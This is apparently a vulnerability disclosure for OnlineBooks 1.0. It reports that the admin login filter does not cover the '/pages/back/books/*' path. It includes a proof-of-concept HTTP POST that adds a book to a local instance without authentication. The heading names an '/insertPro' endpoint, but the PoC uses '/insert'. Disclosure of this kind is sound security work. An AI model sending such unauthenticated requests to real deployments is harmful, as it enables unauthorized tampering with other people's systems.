# There is an unauthorized access vulnerability in OnlineBooks version 1.0. The AdminLoginFilter does not cover the '/pages/back/books/*' path. An unauthorized user can access the /pages/back/books/BooksServlet/insertPro interface by exploiting the doCreate method in BooksDAOImpl.java, and gain unauthorized access to the book addition function to add new books;

Vulnerable Class File: src/cn/ylcto/book/filter/AdminLoginFilter.java



The 9th line of the file does not cover the path of /pages/back/books/*. Unauthenticated users can access the book addition function.

![image-20260802195550036](https://github.com/hhhh333/CVE/blob/picture/image-20260802195550036.png)

The insert method in src/cn/ylcto/book/servlet/BooksServlet.java allows unauthorized addition of books

![image-20260802195535480](https://github.com/hhhh333/CVE/blob/picture/image-20260802195535480.png)

POC for Sending a Request Without Any Permissions:

```
POST /pages/back/books/BooksServlet/insert HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: http://localhost:8080
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

name=%E6%B5%8B%E8%AF%95&aid=admin&iid=1&note=%E6%B5%8B%E8%AF%95
```

![image-20260802195703801](https://github.com/hhhh333/CVE/blob/picture/image-20260802195703801.png)





